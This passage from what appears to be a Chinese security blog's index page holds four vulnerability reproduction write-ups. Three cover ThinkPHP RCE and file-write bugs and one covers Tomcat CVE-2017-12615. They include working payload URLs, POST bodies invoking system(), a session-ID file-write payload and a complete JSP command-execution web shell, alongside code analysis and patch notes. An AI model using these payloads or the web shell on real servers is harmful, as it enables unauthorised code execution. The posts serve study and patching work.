  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/ThinkPHP%202.x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">ThinkPHP 2.x任意代码执行漏洞</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ThinkPHP-2-x任意代码执行漏洞"><a href="#ThinkPHP-2-x任意代码执行漏洞" class="headerlink" title="ThinkPHP 2.x任意代码执行漏洞"></a>ThinkPHP 2.x任意代码执行漏洞</h1><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>thinkphp 2.1</p>
<p>官网的thinkphp 2.2已经修复了</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞位置</p>
<p><img src="https://i.loli.net/2020/01/30/8UW5mxvARaoFlPX.png" alt="image154"></p>
<p>路由解析处</p>
<p><code>$res = preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, implode($depr,$paths));</code></p>
<p>这个preg_replace有点古怪,没有用<code>/</code>来包围搜索模式而是用<code>@</code>,查找关于preg的文档发现</p>
<blockquote>
<p>当使用 PCRE 函数的时候，模式需要由<em>分隔符</em>闭合包裹。分隔符可以使任意非字母数字、非反斜线、非空白字符。   </p>
<p> 经常使用的分隔符是正斜线(<em>/</em>)、hash符号(<em>#</em>)   以及取反符号(<em>~</em>)。下面的例子都是使用合法分隔符的模式。    </p>
<pre><code>/foo bar/
#^[^0-9]$#
+php+
%[a-zA-Z0-9_-]%</code></pre></blockquote>
<p>替换常量,这个就变成了</p>
<p><code>preg_replace(&#39;@(\w+)/([^\/\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, implode(&#39;/&#39;,$paths));</code></p>
<p>查看preg_replace的介绍发现</p>
<blockquote>
<p>当使用被弃用的 e 修饰符时, 这个函数会转义一些字符(即：’、”、 \ 和 NULL) 然后进行后向引用替换。当这些完成后请确保后向引用解析完后没有单引号或双引号引起的语法错误(比如： ‘strlen(&#39;$1&#39;)+strlen(“$2”)’)。确保符合PHP的 字符串语法，并且符合eval语法。因为在完成替换后，引擎会将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串。 </p>
</blockquote>
<p>执行<code>$replacement</code>(第二个参数)前,会先替换掉引用</p>
<p>我们可以看到,<code>$replacement</code>用双引号来包围引用<code>\\2</code>,会导致命令执行</p>
<p>构造</p>
<pre><code class="php">$paths=array(
    &#39;xxxx&#39;,
    &#39;${phpinfo()}&#39;
);</code></pre>
<p>则<code>&#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;</code>变为<code>$var[&#39;xxxx&#39;]=&quot;${phpinfo()}&quot;;</code></p>
<p>从而导致命令执行</p>
<p>于是构造payload</p>
<p><code>[http://127.0.0.1/public/index.php?s=/index/index/name/$%7B@phpinfo()%7D](http://127.0.0.1/public/index.php?s=/index/index/name/${@phpinfo()})</code></p>
<h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p><img src="https://i.loli.net/2020/01/30/9AlHbyKzaBOJXnR.png" alt="image1293"></p>
<p>用单引号来包围所有引用就可以避免命令执行</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://github.com/vulhub/vulhub/tree/master/thinkphp/2-rce" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/thinkphp/2-rce</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://www.ccreater.top/1970/01/01/ThinkPHP">https://www.ccreater.top/1970/01/01/ThinkPHP</a> 2.x任意代码执行漏洞/](<a href="https://www.ccreater.top/1970/01/01/ThinkPHP">https://www.ccreater.top/1970/01/01/ThinkPHP</a> 2.x任意代码执行漏洞/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/ThinkPHP%202.x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ckmn575590027s1nig2jb651p" data-title="ThinkPHP 2.x任意代码执行漏洞" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/ThinkPHP%205.0.0~5.0.23%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/ThinkPHP%205.0.0~5.0.23%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ThinkPHP-5-0-0-5-0-23-RCE-漏洞复现"><a href="#ThinkPHP-5-0-0-5-0-23-RCE-漏洞复现" class="headerlink" title="ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现"></a>ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p> ThinkPHP 5.0.0~5.0.23 </p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code>http://127.0.0.1/index.php?s=captcha

post_ex1：_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami
post_exp2：_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</code></pre><h2 id="过程复现-exp1"><a href="#过程复现-exp1" class="headerlink" title="过程复现(exp1)"></a>过程复现(exp1)</h2><p> 以 thinkphp 5.0.22 完整版为复现环境(为啥要完整版等会说)，下载地址：<a href="http://www.thinkphp.cn/down/1260.html" target="_blank" rel="noopener">http://www.thinkphp.cn/down/1260.html</a> </p>
<p> 官方补丁地址：<a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003</a> </p>
<p><img src="https://i.loli.net/2020/01/30/LohuXMViDeg9AxT.png" alt="image562"></p>
<p>其中<code>$this-&gt;{$this-&gt;method}($_POST);</code>可以执行任意接受一个数组的request方法,<code>$this-&gt;method</code>可以通过控制<code>$_POST[&#39;_method&#39;]</code>来控制</p>
<p>查找相关方法后选定<code>__construct</code>来修改request属性再结合其他方法形成利用链</p>
<pre><code class="php">protected function __construct($options = [])
    {
        foreach ($options as $name =&gt; $item) {
            if (property_exists($this, $name)) {
                $this-&gt;$name = $item;
            }
        }
        if (is_null($this-&gt;filter)) {
            $this-&gt;filter = Config::get(&#39;default_filter&#39;);
        }

        // 保存 php://input
        $this-&gt;input = file_get_contents(&#39;php://input&#39;);
    }</code></pre>
<p>查找request中可能命令执行的方法时发现,input()方法可以通过修改filter来达到任意命令执行的效果</p>
<pre><code class="php">public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
    {
        ...

        // 解析过滤器
        $filter = $this-&gt;getFilter($filter, $default);

        if (is_array($data)) {
            array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);//命令执行
            reset($data);
        } else {
            $this-&gt;filterValue($data, $name, $filter);
        }

        ...
    }</code></pre>
<p><img src="https://i.loli.net/2020/01/30/Fp5XRUNjlxABPWt.png" alt="image1678"></p>
<p>接着查找调用method()的地方,下断点</p>
<p><img src="https://i.loli.net/2020/01/30/F6ZvjtxGdP7uiKa.png" alt="image1768"></p>
<p>从入口点App.php开始查看可能作为攻击链一部分的地方</p>
<p>节选App.php关键内容</p>
<pre><code class="php">public static function run(Request $request = null)
    {
        $request = is_null($request) ? Request::instance() : $request;

        try {
            ...
            // 获取应用调度信息
            $dispatch = self::$dispatch;

            // 未设置调度信息则进行 URL 路由检测
            if (empty($dispatch)) {
                $dispatch = self::routeCheck($request, $config);
            }

            // 记录当前调度信息
            $request-&gt;dispatch($dispatch);

            // 记录路由和请求信息
            ...
            $data = self::exec($dispatch, $config);
        } catch (HttpResponseException $exception) {
            $data = $exception-&gt;getResponse();
        }
        ...
    }</code></pre>
<p>跟进routeCheck</p>
<pre><code class="php">public static function routeCheck($request, array $config)
    {
        $path   = $request-&gt;path();
        $depr   = $config[&#39;pathinfo_depr&#39;];
        $result = false;

        // 路由检测
        $check = !is_null(self::$routeCheck) ? self::$routeCheck : $config[&#39;url_route_on&#39;];
        if ($check) {
            ...
            $result = Route::check($request, $path, $depr, $config[&#39;url_domain_deploy&#39;]);
            ...
        }

        ...

        return $result;
    }</code></pre>
<p>跟进check,在获取method时调用了method方法</p>
<pre><code class="php">public static function check($request, $url, $depr = &#39;/&#39;, $checkDomain = false)
    {
        //检查解析缓存
        ...
        $method = strtolower($request-&gt;method());
        // 获取当前请求类型的路由规则
       ...
    }</code></pre>
<p>返回App.php,我们可以看到一个敏感的函数<code>$data = self::exec($dispatch, $config);</code></p>
<p>跟进exec瞧一瞧</p>
<pre><code class="php">protected static function exec($dispatch, $config)
    {
        switch ($dispatch[&#39;type&#39;]) {
            case &#39;redirect&#39;: // 重定向跳转
                $data = Response::create($dispatch[&#39;url&#39;], &#39;redirect&#39;)
                    -&gt;code($dispatch[&#39;status&#39;]);
                break;
            case &#39;module&#39;: // 模块/控制器/操作
                $data = self::module(
                    $dispatch[&#39;module&#39;],
                    $config,
                    isset($dispatch[&#39;convert&#39;]) ? $dispatch[&#39;convert&#39;] : null
                );
                break;
            case &#39;controller&#39;: // 执行控制器操作
                $vars = array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);
                $data = Loader::action(
                    $dispatch[&#39;controller&#39;],
                    $vars,
                    $config[&#39;url_controller_layer&#39;],
                    $config[&#39;controller_suffix&#39;]
                );
                break;
            case &#39;method&#39;: // 回调方法
                $vars = array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);
                $data = self::invokeMethod($dispatch[&#39;method&#39;], $vars);
                break;
            case &#39;function&#39;: // 闭包
                $data = self::invokeFunction($dispatch[&#39;function&#39;]);
                break;
            case &#39;response&#39;: // Response 实例
                $data = $dispatch[&#39;response&#39;];
                break;
            default:
                throw new \InvalidArgumentException(&#39;dispatch type not support&#39;);
        }

        return $data;
    }</code></pre>
<p>如果<code>$dispatch[&#39;type&#39;]=&#39;controller&#39; or &#39;method&#39;</code>时会调用<code>Request::instance()-&gt;param()</code></p>
<pre><code class="php">public function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
    {
        if (empty($this-&gt;mergeParam)) {
            $method = $this-&gt;method(true);
            // 自动获取请求变量
            ...
            $this-&gt;param      = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));
            $this-&gt;mergeParam = true;
        }
        ...
        return $this-&gt;input($this-&gt;param, $name, $default, $filter);
    }</code></pre>
<p>而param则会调用input从而形成完整的攻击链,其中<code>$filter</code>时我们要执行的命令,<code>$this-&gt;param</code>则是参数,</p>
<p><code>$this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));</code></p>
<p>但是我们不能直接通过修改<code>__construct</code>来修改param,因为在运行过程中<code>$this-&gt;param</code>会被覆盖,但是<code>$this-&gt;get</code>却不会,于是我们需要覆盖<code>$this-&gt;filter</code>和<code>$this-&gt;get</code></p>
<p>接下来就是如何让<code>$dispatch[&#39;type&#39;]=&#39;controller&#39; or &#39;method&#39;</code>的问题了</p>
<p><img src="https://i.loli.net/2020/01/30/qeliaZJokYSUMg2.png" alt="image5781"></p>
<p>这也是为啥要tp完整版的原因,完整版里才有captcha模块</p>
<blockquote>
<p>注意我们请求的路由是<code>?s=captcha</code>，它对应的注册规则为<code>\think\Route::get</code>。在<code>method</code>方法结束后，返回的<code>$this-&gt;method</code>值应为<code>get</code>这样才能不出错，所以payload中有个<code>method=get</code> </p>
</blockquote>
<p>于是最后的payload是</p>
<pre><code>http://127.0.0.1/index.php?s=captcha

_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</code></pre><h2 id="过程复现-exp2"><a href="#过程复现-exp2" class="headerlink" title="过程复现(exp2)"></a>过程复现(exp2)</h2><p>攻击链的前面基本相同,只有调用<code>Request::input</code>方法的地方不同而进入不同分支</p>
<p>我们看到<code>Request::param</code>方法</p>
<pre><code class="php">public function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
    {
        if (empty($this-&gt;mergeParam)) {
            $method = $this-&gt;method(true);
            // 自动获取请求变量
            ...
            $this-&gt;param      = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));
            $this-&gt;mergeParam = true;
        }
        ...
        return $this-&gt;input($this-&gt;param, $name, $default, $filter);
    }</code></pre>
<p>注意这一个<code>$this-&gt;method(true);</code></p>
<p><code>Request::method</code></p>
<pre><code class="php">    public function method($method = false)
    {
        if (true === $method) {
            // 获取原始请求类型
            return $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;
        } 
        ...
    }</code></pre>
<p>它会调用<code>Request::server</code>,而这个方法也会调用<code>Request::input</code></p>
<pre><code class="php">public function server($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
    {
        if (empty($this-&gt;server)) {
            $this-&gt;server = $_SERVER;
        }
        if (is_array($name)) {
            return $this-&gt;server = array_merge($this-&gt;server, $name);
        }
        return $this-&gt;input($this-&gt;server, false === $name ? false : strtoupper($name), $default, $filter);
    }</code></pre>
<p>继续分析代码发现,rce的参数变为了<code>$this-&gt;server[&#39;REQUEST_METHOD&#39;]</code></p>
<pre><code class="php">public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
    {
        if (&#39;&#39; != $name) {
            // 解析name
            if (strpos($name, &#39;/&#39;)) {
                list($name, $type) = explode(&#39;/&#39;, $name);
            } else {
                $type = &#39;s&#39;;
            }
            // 按.拆分成多维数组进行判断
            foreach (explode(&#39;.&#39;, $name) as $val) {
                if (isset($data[$val])) {
                    $data = $data[$val];
                } else {
                    // 无输入数据，返回默认值
                    return $default;
                }
            }
            if (is_object($data)) {
                return $data;
            }
        }

        // 解析过滤器
        $filter = $this-&gt;getFilter($filter, $default);

        ...
        return $data;
    }</code></pre>
<p>于是有</p>
<pre><code class="php">http://127.0.0.1/public/index.php?s=captcha

POST:

_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</code></pre>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="[https://www.smi1e.top/thinkphp-5-0-05-0-23-rce-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/](https://www.smi1e.top/thinkphp-5-0-05-0-23-rce-漏洞分析/)">Smi1e —- ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析</a></p>
<p> <a href="https://xz.aliyun.com/t/3845#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845#toc-2</a> </p>
<p> <a href="https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://www.ccreater.top/1970/01/01/ThinkPHP">https://www.ccreater.top/1970/01/01/ThinkPHP</a> 5.0.0<del>5.0.23 RCE 漏洞复现/](<a href="https://www.ccreater.top/1970/01/01/ThinkPHP">https://www.ccreater.top/1970/01/01/ThinkPHP</a> 5.0.0</del>5.0.23 RCE 漏洞复现/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/ThinkPHP%205.0.0~5.0.23%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" data-id="ckmn5755a002bs1ni20ve9k29" data-title="ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-ThinkPHP6 任意文件操作漏洞分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">ThinkPHP6 任意文件操作漏洞分析</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ThinkPHP6-任意文件操作漏洞分析"><a href="#ThinkPHP6-任意文件操作漏洞分析" class="headerlink" title="ThinkPHP6 任意文件操作漏洞分析"></a>ThinkPHP6 任意文件操作漏洞分析</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol>
<li>ThinkPHP6.0.0-6.0.1</li>
<li>开启Sessoin中间件</li>
</ol>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>官方commit: <a href="https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2</a> </p>
<p>复现环境为:phpstudy+thinkphp6.0.1</p>
<p><code>\app\controller\index.php</code>:</p>
<pre><code class="php">&lt;?php
namespace app\controller;

use app\BaseController;
use think\facade\Session;
class Index extends BaseController
{
    public function index($name)
    {
        Session::set(&#39;name&#39;, $name);
        return &#39;hello,&#39; . Session::get(&#39;name&#39;);;
    }

}</code></pre>
<p><code>\app\middleware.php</code></p>
<pre><code class="php">&lt;?php
// 全局中间件定义文件
return [
    // 全局请求缓存
    // \think\middleware\CheckRequestCache::class,
    // 多语言加载
    // \think\middleware\LoadLangPack::class,
//     Session初始化
     \think\middleware\SessionInit::class
];</code></pre>
<p>根据漏洞的信息(任意文件操作),我们从<code>vendor\topthink\framework\src\think\session\Store.php</code> 的<code>save</code>函数开始进行分析</p>
<pre><code class="php">public function save(): void
    {
        $this-&gt;clearFlashData();//清除原来的数据

        $sessionId = $this-&gt;getId();

        if (!empty($this-&gt;data)) {
            $data = $this-&gt;serialize($this-&gt;data);

            $this-&gt;handler-&gt;write($sessionId, $data);
        } else {
            $this-&gt;handler-&gt;delete($sessionId);
        }

        $this-&gt;init = false;
    }</code></pre>
<p>跟进<code>$this-&gt;handler-&gt;write</code>方法看一下</p>
<pre><code class="php">public function write(string $sessID, string $sessData): bool
    {
        $filename = $this-&gt;getFileName($sessID, true);
        $data     = $sessData;

        if ($this-&gt;config[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) {
            //数据压缩
            $data = gzcompress($data, 3);
        }

        return $this-&gt;writeFile($filename, $data);
    }</code></pre>
<p>再跟进<code>$this-&gt;writeFile</code></p>
<pre><code class="php">protected function writeFile($path, $content): bool
    {
        return (bool) file_put_contents($path, $content, LOCK_EX);
    }</code></pre>
<p>因为<code>$data</code>可控,那么我们只要能控制<code>$path</code>我们就可以写shell进去了</p>
<p>而<code>$path</code>由<code>$this-&gt;getFileName($sessID, true);</code>得到</p>
<p>跟进去</p>
<pre><code class="php">    protected function getFileName(string $name, bool $auto = false): string
    {
        if ($this-&gt;config[&#39;prefix&#39;]) {
            // 使用子目录
            $name = $this-&gt;config[&#39;prefix&#39;] . DIRECTORY_SEPARATOR . &#39;sess_&#39; . $name;
        } else {
            $name = &#39;sess_&#39; . $name;
        }

        $filename = $this-&gt;config[&#39;path&#39;] . $name;
        $dir      = dirname($filename);

        if ($auto &amp;&amp; !is_dir($dir)) {
            try {
                mkdir($dir, 0755, true);
            } catch (\Exception $e) {
                // 创建失败
            }
        }

        return $filename;
    }</code></pre>
<p><code>$filename</code>直接由末端拼接参数<code>$name</code></p>
<p>而<code>write</code>调用<code>getFileName</code>时直接将参数<code>$sessID</code>传入,<code>$sessID</code>由<code>$sessionId = $this-&gt;getId();</code>获得</p>
<pre><code class="php">    public function getId(): string
    {
        return $this-&gt;id;
    }</code></pre>
<p><code>$this-&gt;id</code>时通过<code>setId()</code>来设置的</p>
<pre><code class="php">    public function setId($id = null): void
    {
        $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 ? $id : md5(microtime(true) . session_create_id());
    }</code></pre>
<p>如果<code>is_string($id) &amp;&amp; strlen($id) === 32</code>满足,则直接将<code>$id</code>的值赋给<code>$this-&gt;id</code></p>
<p>查找调用setId的函数</p>
<p><img src="https://i.loli.net/2020/02/01/cAes3Wot8BFbkjP.png" alt="image3070"></p>
<p>其中<code>SessionInit</code></p>
<pre><code class="php">    public function handle($request, Closure $next)
    {
        // Session初始化
        $varSessionId = $this-&gt;app-&gt;config-&gt;get(&#39;session.var_session_id&#39;);
        $cookieName   = $this-&gt;session-&gt;getName();

        if ($varSessionId &amp;&amp; $request-&gt;request($varSessionId)) {
            $sessionId = $request-&gt;request($varSessionId);
        } else {
            $sessionId = $request-&gt;cookie($cookieName);
        }

        if ($sessionId) {
            $this-&gt;session-&gt;setId($sessionId);
        }
    }</code></pre>
<p>查找配置发现<code>$sessionId</code>=&gt;<code>$_COOKIE[&#39;PHPSESSID&#39;]</code></p>
<p>因此构造payload</p>
<pre><code>http://127.0.0.1/tp/public/index.php?s=/index/index/&amp;name=%3C?php%20phpinfo();?%3E

Cookie :PHPSESSID=9f7777c08f3909751b148338ba08.php

访问http://127.0.0.1/tp/runtime/session/sess_9f7777c08f3909751b148338ba08.php</code></pre><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><pre><code class="php">public function setId($id=null):void
{
    $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 &amp;&amp; ctype_alnum($id) ? $id : md5(microtime(true) . session_create_id());
}</code></pre>
<p>在<code>setId</code>中增加了对<code>$id</code>的校验:<code>ctype_alnum($id)</code>,只允许数字或字母,来避免任意文件操作</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://paper.seebug.org/1114/#_1" target="_blank" rel="noopener">https://paper.seebug.org/1114/#_1</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://www.ccreater.top/1970/01/01/ThinkPHP6">https://www.ccreater.top/1970/01/01/ThinkPHP6</a> 任意文件操作漏洞分析/](<a href="https://www.ccreater.top/1970/01/01/ThinkPHP6">https://www.ccreater.top/1970/01/01/ThinkPHP6</a> 任意文件操作漏洞分析/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-id="ckmn5755b002es1nidvvacpvc" data-title="ThinkPHP6 任意文件操作漏洞分析" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-Tomcat PUT方法任意写文件漏洞CVE-2017-12615" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9ECVE-2017-12615/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9ECVE-2017-12615/">Tomcat PUT方法任意写文件漏洞CVE-2017-12615</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）"><a href="#Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）" class="headerlink" title="Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）"></a>Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p> Apache Tomcat 7.0.0 - 7.0.79 </p>
<p>平台: Windows </p>
<p> 启用了 HTTP PUT 请求方法  (conf/web.xml 中对于 DefaultServlet 的 readonly 设置为 false)</p>
<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>不能直接上传jsp结尾的文件</p>
<p>利用windows平台下:<code>sample.txt::$DATA</code>等价于<code>sample.txt</code>的特性来写shell</p>
<pre><code>PUT /111.jsp::$DATA HTTP/1.1
Host: 10.1.1.6:8080
User-Agent: JNTASS
DNT: 1
Connection: close

...jsp shell...</code></pre><pre><code>PUT /111.jsp/ HTTP/1.1
Host: 10.1.1.6:8080
User-Agent: JNTASS
DNT: 1
Connection: close

...jsp shell...</code></pre><pre><code class="java">&lt;%
    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print(&quot;&lt;pre&gt;&quot;);
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print(&quot;&lt;/pre&gt;&quot;);
    }
%&gt;</code></pre>
<h2 id="检测脚本"><a href="#检测脚本" class="headerlink" title="检测脚本"></a>检测脚本</h2><pre><code class="python">import requests
def poc(url):
    filename=&quot;tomcat_check_vuln.txt&quot;
    content=&quot;test&quot;
    try:
        requests.put(url+&quot;/&quot;+filename,data=conetent)
        res=requests.get(url+&quot;/&quot;+filename)
    except :
        return False

    if res.status_code==200:
        return True
    return False
</code></pre>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://www.ccreater.top/1970/01/01/Tomcat">https://www.ccreater.top/1970/01/01/Tomcat</a> PUT方法任意写文件漏洞CVE-2017-12615/](<a href="https://www.ccreater.top/1970/01/01/Tomcat">https://www.ccreater.top/1970/01/01/Tomcat</a> PUT方法任意写文件漏洞CVE-2017-12615/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9ECVE-2017-12615/" data-id="ckmn5756j0044s1nict42ehcy" data-title="Tomcat PUT方法任意写文件漏洞CVE-2017-12615" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>





  


  <nav id="page-nav">
    
